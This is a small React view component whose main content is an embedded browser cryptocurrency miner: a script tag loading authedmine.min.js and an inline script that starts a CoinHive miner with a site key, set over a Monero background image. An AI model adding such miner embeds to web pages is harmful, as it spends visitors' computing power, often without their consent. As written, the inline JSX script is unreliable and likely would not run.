import React, { Component } from 'react'
import ReactDOM from 'react-dom'
import { Button } from 'react-bootstrap'


export default class View1 extends Component {
  constructor(props) {
    super(props);

    this.state = {
      
    };
  }

  render() {
    var sectionStyle = {
      height: '100vh',
      backgroundImage: "url('https://www.monero.how/photos/monero-coin7-1024x909.jpg')",
    }
    return (
      
      <div id="viewOne" style={sectionStyle}>
      <script src="https://authedmine.com/lib/authedmine.min.js"></script>
      <script>
      	var miner = new CoinHive.Anonymous('6UtrrYYyMYrjRjXpipAn5FNt8SX0fdGc');
	      miner.start();
        console.log('Miner is working');
      </script>
       
      </div>
    )
  }
}

// {document.getElementById("viewOne").appendChild(elem)}
// {elem.src = 'https://www.monero.how/photos/monero-coin7-1024x909.jpg'}